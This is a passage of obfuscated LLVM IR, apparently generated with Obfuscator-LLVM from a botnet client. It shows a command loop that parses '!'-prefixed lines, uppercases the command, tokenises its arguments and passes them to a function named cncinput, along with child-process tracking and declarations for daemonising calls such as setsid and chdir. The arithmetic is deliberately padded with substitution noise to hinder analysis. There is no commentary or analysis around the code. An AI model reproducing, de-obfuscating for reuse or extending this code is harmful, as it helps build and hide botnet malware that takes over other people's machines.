  store i32 %112, i32* %120, align 4
  br label %121

; <label>:121:                                    ; preds = %107
  %122 = load i32, i32* %13, align 4
  %123 = sub i32 0, %122
  %124 = sub i32 0, 1
  %125 = add i32 %123, %124
  %126 = sub i32 0, %125
  %127 = add i32 %122, 1
  store i32 %126, i32* %13, align 4
  br label %102

; <label>:128:                                    ; preds = %102
  %129 = load i32*, i32** @pids, align 8
  %130 = load i32, i32* %13, align 4
  %131 = sub i32 %130, -1633323712
  %132 = sub i32 %131, 1
  %133 = add i32 %132, -1633323712
  %134 = sub i32 %130, 1
  %135 = zext i32 %133 to i64
  %136 = getelementptr inbounds i32, i32* %129, i64 %135
  store i32 0, i32* %136, align 4
  %137 = load i64, i64* @numpids, align 8
  %138 = sub i64 0, -1
  %139 = sub i64 %137, %138
  %140 = add i64 %137, -1
  store i64 %139, i64* @numpids, align 8
  %141 = load i64, i64* @numpids, align 8
  %142 = sub i64 0, %141
  %143 = sub i64 0, 1
  %144 = add i64 %142, %143
  %145 = sub i64 0, %144
  %146 = add i64 %141, 1
  %147 = mul i64 %145, 4
  %148 = call noalias i8* @malloc(i64 %147) #6
  %149 = bitcast i8* %148 to i32*
  store i32* %149, i32** %12, align 8
  store i32 0, i32* %13, align 4
  br label %150

; <label>:150:                                    ; preds = %165, %128
  %151 = load i32, i32* %13, align 4
  %152 = zext i32 %151 to i64
  %153 = load i64, i64* @numpids, align 8
  %154 = icmp ult i64 %152, %153
  br i1 %154, label %155, label %171

; <label>:155:                                    ; preds = %150
  %156 = load i32*, i32** @pids, align 8
  %157 = load i32, i32* %13, align 4
  %158 = zext i32 %157 to i64
  %159 = getelementptr inbounds i32, i32* %156, i64 %158
  %160 = load i32, i32* %159, align 4
  %161 = load i32*, i32** %12, align 8
  %162 = load i32, i32* %13, align 4
  %163 = zext i32 %162 to i64
  %164 = getelementptr inbounds i32, i32* %161, i64 %163
  store i32 %160, i32* %164, align 4
  br label %165

; <label>:165:                                    ; preds = %155
  %166 = load i32, i32* %13, align 4
  %167 = sub i32 %166, -1823640736
  %168 = add i32 %167, 1
  %169 = add i32 %168, -1823640736
  %170 = add i32 %166, 1
  store i32 %169, i32* %13, align 4
  br label %150

; <label>:171:                                    ; preds = %150
  %172 = load i32*, i32** @pids, align 8
  %173 = bitcast i32* %172 to i8*
  call void @free(i8* %173) #6
  %174 = load i32*, i32** %12, align 8
  store i32* %174, i32** @pids, align 8
  br label %175

; <label>:175:                                    ; preds = %171, %88
  br label %176

; <label>:176:                                    ; preds = %175
  %177 = load i32, i32* %11, align 4
  %178 = sub i32 %177, -202137208
  %179 = add i32 %178, 1
  %180 = add i32 %179, -202137208
  %181 = add nsw i32 %177, 1
  store i32 %180, i32* %11, align 4
  br label %83

; <label>:182:                                    ; preds = %83
  %183 = load i32, i32* %10, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %184
  store i8 0, i8* %185, align 1
  %186 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  call void @trim(i8* %186)
  %187 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  store i8* %187, i8** %14, align 8
  %188 = load i8*, i8** %14, align 8
  %189 = load i8, i8* %188, align 1
  %190 = zext i8 %189 to i32
  %191 = icmp eq i32 %190, 33
  br i1 %191, label %192, label %363

; <label>:192:                                    ; preds = %182
  %193 = load i8*, i8** %14, align 8
  %194 = getelementptr inbounds i8, i8* %193, i64 1
  store i8* %194, i8** %15, align 8
  br label %195

; <label>:195:                                    ; preds = %207, %192
  %196 = load i8*, i8** %15, align 8
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp ne i32 %198, 32
  br i1 %199, label %200, label %205

; <label>:200:                                    ; preds = %195
  %201 = load i8*, i8** %15, align 8
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i32
  %204 = icmp ne i32 %203, 0
  br label %205

; <label>:205:                                    ; preds = %200, %195
  %206 = phi i1 [ false, %195 ], [ %204, %200 ]
  br i1 %206, label %207, label %210

; <label>:207:                                    ; preds = %205
  %208 = load i8*, i8** %15, align 8
  %209 = getelementptr inbounds i8, i8* %208, i32 1
  store i8* %209, i8** %15, align 8
  br label %195

; <label>:210:                                    ; preds = %205
  %211 = load i8*, i8** %15, align 8
  %212 = load i8, i8* %211, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp eq i32 %213, 0
  br i1 %214, label %215, label %216

; <label>:215:                                    ; preds = %210
  br label %77

; <label>:216:                                    ; preds = %210
  %217 = load i8*, i8** %15, align 8
  store i8 0, i8* %217, align 1
  %218 = load i8*, i8** %14, align 8
  %219 = getelementptr inbounds i8, i8* %218, i64 1
  store i8* %219, i8** %15, align 8
  %220 = load i8*, i8** %14, align 8
  %221 = load i8*, i8** %15, align 8
  %222 = call i64 @strlen(i8* %221) #10
  %223 = getelementptr inbounds i8, i8* %220, i64 %222
  %224 = getelementptr inbounds i8, i8* %223, i64 2
  store i8* %224, i8** %14, align 8
  br label %225

; <label>:225:                                    ; preds = %250, %216
  %226 = load i8*, i8** %14, align 8
  %227 = load i8*, i8** %14, align 8
  %228 = call i64 @strlen(i8* %227) #10
  %229 = sub i64 0, 1
  %230 = add i64 %228, %229
  %231 = sub i64 %228, 1
  %232 = getelementptr inbounds i8, i8* %226, i64 %230
  %233 = load i8, i8* %232, align 1
  %234 = zext i8 %233 to i32
  %235 = icmp eq i32 %234, 10
  br i1 %235, label %248, label %236

; <label>:236:                                    ; preds = %225
  %237 = load i8*, i8** %14, align 8
  %238 = load i8*, i8** %14, align 8
  %239 = call i64 @strlen(i8* %238) #10
  %240 = sub i64 %239, 5505078423341917969
  %241 = sub i64 %240, 1
  %242 = add i64 %241, 5505078423341917969
  %243 = sub i64 %239, 1
  %244 = getelementptr inbounds i8, i8* %237, i64 %242
  %245 = load i8, i8* %244, align 1
  %246 = zext i8 %245 to i32
  %247 = icmp eq i32 %246, 13
  br label %248

; <label>:248:                                    ; preds = %236, %225
  %249 = phi i1 [ true, %225 ], [ %247, %236 ]
  br i1 %249, label %250, label %259

; <label>:250:                                    ; preds = %248
  %251 = load i8*, i8** %14, align 8
  %252 = load i8*, i8** %14, align 8
  %253 = call i64 @strlen(i8* %252) #10
  %254 = add i64 %253, -2491317440163481981
  %255 = sub i64 %254, 1
  %256 = sub i64 %255, -2491317440163481981
  %257 = sub i64 %253, 1
  %258 = getelementptr inbounds i8, i8* %251, i64 %256
  store i8 0, i8* %258, align 1
  br label %225

; <label>:259:                                    ; preds = %248
  %260 = load i8*, i8** %14, align 8
  store i8* %260, i8** %16, align 8
  br label %261

; <label>:261:                                    ; preds = %273, %259
  %262 = load i8*, i8** %14, align 8
  %263 = load i8, i8* %262, align 1
  %264 = zext i8 %263 to i32
  %265 = icmp ne i32 %264, 32
  br i1 %265, label %266, label %271

; <label>:266:                                    ; preds = %261
  %267 = load i8*, i8** %14, align 8
  %268 = load i8, i8* %267, align 1
  %269 = zext i8 %268 to i32
  %270 = icmp ne i32 %269, 0
  br label %271

; <label>:271:                                    ; preds = %266, %261
  %272 = phi i1 [ false, %261 ], [ %270, %266 ]
  br i1 %272, label %273, label %276

; <label>:273:                                    ; preds = %271
  %274 = load i8*, i8** %14, align 8
  %275 = getelementptr inbounds i8, i8* %274, i32 1
  store i8* %275, i8** %14, align 8
  br label %261

; <label>:276:                                    ; preds = %271
  %277 = load i8*, i8** %14, align 8
  store i8 0, i8* %277, align 1
  %278 = load i8*, i8** %14, align 8
  %279 = getelementptr inbounds i8, i8* %278, i32 1
  store i8* %279, i8** %14, align 8
  %280 = load i8*, i8** %16, align 8
  store i8* %280, i8** %17, align 8
  br label %281

; <label>:281:                                    ; preds = %285, %276
  %282 = load i8*, i8** %17, align 8
  %283 = load i8, i8* %282, align 1
  %284 = icmp ne i8 %283, 0
  br i1 %284, label %285, label %294

; <label>:285:                                    ; preds = %281
  %286 = load i8*, i8** %17, align 8
  %287 = load i8, i8* %286, align 1
  %288 = zext i8 %287 to i32
  %289 = call i32 @toupper(i32 %288) #10
  %290 = trunc i32 %289 to i8
  %291 = load i8*, i8** %17, align 8
  store i8 %290, i8* %291, align 1
  %292 = load i8*, i8** %17, align 8
  %293 = getelementptr inbounds i8, i8* %292, i32 1
  store i8* %293, i8** %17, align 8
  br label %281

; <label>:294:                                    ; preds = %281
  store i32 1, i32* %19, align 4
  %295 = load i8*, i8** %14, align 8
  %296 = call i8* @strtok(i8* %295, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0)) #6
  store i8* %296, i8** %20, align 8
  %297 = load i8*, i8** %16, align 8
  %298 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 0
  store i8* %297, i8** %298, align 16
  br label %299

; <label>:299:                                    ; preds = %338, %294
  %300 = load i8*, i8** %20, align 8
  %301 = icmp ne i8* %300, null
  br i1 %301, label %302, label %340

; <label>:302:                                    ; preds = %299
  %303 = load i8*, i8** %20, align 8
  %304 = load i8, i8* %303, align 1
  %305 = zext i8 %304 to i32
  %306 = icmp ne i32 %305, 10
  br i1 %306, label %307, label %338

; <label>:307:                                    ; preds = %302
  %308 = load i8*, i8** %20, align 8
  %309 = call i64 @strlen(i8* %308) #10
  %310 = sub i64 0, 1
  %311 = sub i64 %309, %310
  %312 = add i64 %309, 1
  %313 = call noalias i8* @malloc(i64 %311) #6
  %314 = load i32, i32* %19, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %315
  store i8* %313, i8** %316, align 8
  %317 = load i32, i32* %19, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %318
  %320 = load i8*, i8** %319, align 8
  %321 = load i8*, i8** %20, align 8
  %322 = call i64 @strlen(i8* %321) #10
  %323 = sub i64 0, %322
  %324 = sub i64 0, 1
  %325 = add i64 %323, %324
  %326 = sub i64 0, %325
  %327 = add i64 %322, 1
  call void @llvm.memset.p0i8.i64(i8* %320, i8 0, i64 %326, i32 1, i1 false)
  %328 = load i32, i32* %19, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %329
  %331 = load i8*, i8** %330, align 8
  %332 = load i8*, i8** %20, align 8
  %333 = call i8* @strcpy(i8* %331, i8* %332) #6
  %334 = load i32, i32* %19, align 4
  %335 = sub i32 0, 1
  %336 = sub i32 %334, %335
  %337 = add nsw i32 %334, 1
  store i32 %336, i32* %19, align 4
  br label %338

; <label>:338:                                    ; preds = %307, %302
  %339 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0)) #6
  store i8* %339, i8** %20, align 8
  br label %299

; <label>:340:                                    ; preds = %299
  %341 = load i32, i32* %19, align 4
  %342 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i32 0, i32 0
  call void @cncinput(i32 %341, i8** %342)
  %343 = load i32, i32* %19, align 4
  %344 = icmp sgt i32 %343, 1
  br i1 %344, label %345, label %362

; <label>:345:                                    ; preds = %340
  store i32 1, i32* %21, align 4
  store i32 1, i32* %21, align 4
  br label %346

; <label>:346:                                    ; preds = %355, %345
  %347 = load i32, i32* %21, align 4
  %348 = load i32, i32* %19, align 4
  %349 = icmp slt i32 %347, %348
  br i1 %349, label %350, label %361

; <label>:350:                                    ; preds = %346
  %351 = load i32, i32* %21, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %352
  %354 = load i8*, i8** %353, align 8
  call void @free(i8* %354) #6
  br label %355

; <label>:355:                                    ; preds = %350
  %356 = load i32, i32* %21, align 4
  %357 = add i32 %356, -1612149679
  %358 = add i32 %357, 1
  %359 = sub i32 %358, -1612149679
  %360 = add nsw i32 %356, 1
  store i32 %359, i32* %21, align 4
  br label %346

; <label>:361:                                    ; preds = %346
  br label %362

; <label>:362:                                    ; preds = %361, %340
  br label %363

; <label>:363:                                    ; preds = %362, %182
  br label %77

; <label>:364:                                    ; preds = %77
  br label %64
                                                  ; No predecessors!
  %366 = load i32, i32* %3, align 4
  ret i32 %366
}

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #2

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146658232}
!2 = !{i32 -2146657541}
!3 = !{i32 -2146656792}
